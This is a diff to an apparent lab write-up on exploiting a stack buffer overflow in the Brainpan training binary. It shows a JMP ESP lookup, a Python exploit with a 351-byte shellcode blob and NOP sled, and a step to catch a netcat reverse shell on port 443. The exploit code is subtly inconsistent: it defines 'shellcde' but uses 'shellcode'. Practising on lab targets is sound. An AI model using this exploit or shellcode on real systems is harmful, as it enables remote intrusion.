@@ -146,7 +146,7 @@ as you can see we can control EIP register with `BBBB` that's Great, now we need
 
 ![Screen Shot 2021-08-26 at 1 06 26 PM](https://user-images.githubusercontent.com/47929033/130952539-25118c43-c5f0-4010-99d0-fd3a529296aa.png)
 
-as you can see this is module, we will use module with have all false `brainpan.exe` but we need to use `msf-nasm-shell` to know the code of `JMP ESP register` we can use command: `msf-nasm-shell`
+as you can see this is module, we will use module with have `SafeSEH:false and ASLR: false`  `brainpan.exe` but we need to use `msf-nasm-shell` to know the code of `JMP ESP register` we can use command: `msf-nasm-shell`
 then type `JMP ESP`, Just Like the image Below: 
 
 ![Screen Shot 2021-08-26 at 1 15 29 PM](https://user-images.githubusercontent.com/47929033/130953400-3f30e6ab-5c8e-4167-a8ea-b6d82994bddb.png)
@@ -196,7 +196,7 @@ import socket
 # EIP OverWrite: 524 
 # "A" * 524 + "BBBB" + "C" * 72 
 
-shellcde = "\xda\xd3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb8\x6b\x5c\x9f\x9c\xb1"
+shellcde = ("\xda\xd3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb8\x6b\x5c\x9f\x9c\xb1"
 "\x52\x31\x43\x17\x83\xeb\xfc\x03\x28\x4f\x7d\x69\x52\x87\x03"
 "\x92\xaa\x58\x64\x1a\x4f\x69\xa4\x78\x04\xda\x14\x0a\x48\xd7"
 "\xdf\x5e\x78\x6c\xad\x76\x8f\xc5\x18\xa1\xbe\xd6\x31\x91\xa1"
@@ -219,7 +219,7 @@ shellcde = "\xda\xd3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb8\x6b\x5c\x9f\x9c\xb1"
 "\xfb\x96\xd7\xb8\x03\xf3\xa1\x24\xb5\xaa\xf7\x5b\x7a\x3b\xf0"
 "\x24\x66\xdb\xff\xff\x22\xeb\xb5\x5d\x02\x64\x10\x34\x16\xe9"
 "\xa3\xe3\x55\x14\x20\x01\x26\xe3\x38\x60\x23\xaf\xfe\x99\x59"
-"\xa0\x6a\x9d\xce\xc1\xbe"  # 351 bytes
+"\xa0\x6a\x9d\xce\xc1\xbe")  # 351 bytes
 
 buffer = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 100 +  shellcode 	
 
@@ -252,7 +252,7 @@ as you can see :
 
 copy the shellcode to exploit and run exploit by changing ip address then final exploit : 
 
-![Screen Shot 2021-10-19 at 5 20 28 PM](https://user-images.githubusercontent.com/47929033/137941686-856a31e7-b3af-47a9-a5da-d916f4472fa5.png)
+![Screen Shot 2021-10-19 at 5 32 12 PM](https://user-images.githubusercontent.com/47929033/137943442-9e2c3e39-24a8-4b47-ad65-a5eda74b31b3.png)
 
 Run exploit again and listen to port 443 to get a reverse shell by using netcat : 
 
